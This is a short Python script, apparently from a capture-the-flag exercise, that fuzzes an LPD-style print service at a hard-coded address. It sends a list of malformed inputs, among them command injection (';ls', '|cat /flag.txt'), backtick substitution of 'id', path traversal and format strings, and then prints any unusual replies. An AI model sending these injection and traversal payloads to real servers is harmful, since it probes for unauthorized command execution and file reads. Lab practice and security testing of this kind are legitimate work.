#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

def test(data, desc):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        s.sendall(data)
        time.sleep(0.5)
        
        resp = b''
        s.settimeout(2)
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        
        s.close()
        return resp
    except Exception as e:
        return f"Error: {e}".encode()

# Edge cases y malformed input
tests = [
    (b'\x04lp\x00\n', "Comando con null byte antes de newline"),
    (b'\x04lp\r\n', "Comando con CRLF"),
    (b'\x04lp\n\n', "Comando con doble newline"),
    (b'\x04lp' + b'A'*1000 + b'\n', "Comando con padding largo"),
    (b'\x04' + b'lp'*100 + b'\n', "Nombre de cola repetido"),
    (b'\x04\n', "Comando sin cola"),
    (b'\x04 \n', "Comando con solo espacio"),
    (b'\x04%s\n', "Comando con format string"),
    (b'\x04${PATH}\n', "Comando con variable de entorno"),
    (b'\x04`id`\n', "Comando con command substitution"),
    (b'\x04;ls\n', "Comando con command injection"),
    (b'\x04|cat /flag.txt\n', "Comando con pipe"),
    (b'\x04\nlp\n', "Newline antes del nombre"),
    (b'\x04\x00lp\n', "Null byte después del comando"),
    (b'\x04/../../../flag\n', "Path traversal simple"),
    (b'\x00\x00\x00\x00', "Solo null bytes"),
    (b'\xff\xff\xff\xff', "Bytes 0xFF"),
    (b'\x04' + bytes(range(256)) + b'\n', "Todos los bytes posibles"),
]

print("=== Testing edge cases ===\n")
for data, desc in tests:
    print(f"{desc}")
    resp = test(data, desc)
    if len(resp) > 1 or (len(resp) == 1 and resp != b'\x00'):
        print(f"  *** INTERESTING: {len(resp)} bytes ***")
        print(f"  Hex: {resp[:200].hex()}")
        try:
            decoded = resp.decode('utf-8', errors='replace')
            if decoded.strip() and decoded != '\x00':
                print(f"  Text: {decoded[:300]}")
        except:
            pass
        print()
    else:
        print(f"  Normal: {len(resp)} bytes")
print("\nDone.")